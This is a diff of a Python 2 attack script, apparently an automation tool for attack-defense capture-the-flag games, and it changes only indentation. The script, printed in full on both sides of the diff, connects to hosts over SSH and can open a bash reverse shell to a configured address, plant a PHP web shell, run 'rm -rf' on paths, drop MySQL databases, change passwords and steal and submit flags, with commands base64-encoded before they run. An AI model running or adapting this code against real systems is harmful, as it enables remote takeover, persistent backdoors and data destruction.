@@ -127,37 +127,37 @@ def get_flag(ssh_client):
 def extend_cmd_exec(ssh_client,cmd):
     is_read = True
     if cmd == 'reverse_shell':
-	is_read = False
-	cmd = '/bin/bash -i >& /dev/tcp/%s/%s 0>&1' %(reverse_ip,reverse_port)
+        is_read = False
+        cmd = '/bin/bash -i >& /dev/tcp/%s/%s 0>&1' %(reverse_ip,reverse_port)
     elif cmd == 'rm_file':
-	cmd = 'rm -rf %s'%rm_paths
+        cmd = 'rm -rf %s'%rm_paths
     elif cmd == 'get_shell':
-	cmd = "echo '<?php system($_POST[222]);?>' > %s/admin.php"% web_path
+        cmd = "echo '<?php system($_POST[222]);?>' > %s/admin.php"% web_path
     elif cmd == "rm_db":
-	cmd = ''
-	for db in db_name:
-	    cmd += 'mysql -u%s -p%s -e "drop database %s;";' % (db_user, db_passwd, db)
+        cmd = ''
+        for db in db_name:
+            cmd += 'mysql -u%s -p%s -e "drop database %s;";' % (db_user, db_passwd, db)
     elif cmd == "get_flag" or cmd == "get_flag_2":
-	# Because we have run get flag before, so we do notiong here
-	return
+        # Because we have run get flag before, so we do notiong here
+        return
     elif cmd == "change_password":
-	print '[+] start to change password in the remote host'
-	new_password = md5(ssh_password)
-	if ssh_client.change_password(new_password):
-	    ssh_client.save_info("autossh/success.log")
-	    ssh_client.save_info('autossh/now.txt')
-	    print "[+] %s => %s (Success!)" % (ssh_client.infomation(), new_password)
-	else:
-	    print "[-] %s => %s (Failed!)" % (ssh_client.infomation(), new_password)
-	return
-	    
+        print '[+] start to change password in the remote host'
+        new_password = md5(ssh_password)
+        if ssh_client.change_password(new_password):
+            ssh_client.save_info("autossh/success.log")
+            ssh_client.save_info('autossh/now.txt')
+            print "[+] %s => %s (Success!)" % (ssh_client.infomation(), new_password)
+        else:
+            print "[-] %s => %s (Failed!)" % (ssh_client.infomation(), new_password)
+        return
+            
     cmd = base64.b64encode(cmd)
     cmd = "echo %s | base64 -d| bash" %cmd
     print "[-] Attack payload:" + cmd
     if is_read:
-	print ssh_client.exec_command(cmd)[1].read().strip("\n\t ")
+        print ssh_client.exec_command(cmd)[1].read().strip("\n\t ")
     else:
-	ssh_client.exec_command(cmd)
+        ssh_client.exec_command(cmd)
 
 def main():
     if len(sys.argv) != 3:
@@ -187,22 +187,22 @@ def main():
         if len(ssh_clients) == 0:
             print "[+] No client... Breaking..."
             break
-	# If we want to  change passwd, we need to rewrite the now.txt
-	if cmd == "change_password":
-	    open('autossh/now.txt','w').write('')
+        # If we want to  change passwd, we need to rewrite the now.txt
+        if cmd == "change_password":
+            open('autossh/now.txt','w').write('')
         for ssh_client in ssh_clients:
-	    # Get flag
-	    if cmd == "get_flag" or cmd == "get_flag_2":
-		print "[+] Starting get flag..."
-		flag = get_flag(ssh_client)
-		print "[+] Flag : %s" % (flag)
-		if submit_flag(flag):
-	            print "[+] Submit success!"
-		else:
-		    print "[-] Submit failed!"
-	    # Try to execute cmd 
-	    print "[+] Execute user cmd:%s" % cmd
-	    extend_cmd_exec(ssh_client,cmd)
+            # Get flag
+            if cmd == "get_flag" or cmd == "get_flag_2":
+                print "[+] Starting get flag..."
+                flag = get_flag(ssh_client)
+                print "[+] Flag : %s" % (flag)
+                if submit_flag(flag):
+                    print "[+] Submit success!"
+                else:
+                    print "[-] Submit failed!"
+            # Try to execute cmd 
+            print "[+] Execute user cmd:%s" % cmd
+            extend_cmd_exec(ssh_client,cmd)
         for i in range(script_runtime_span):
             print "[+] Waiting : %s seconds..." % (script_runtime_span - i)
             time.sleep(1)
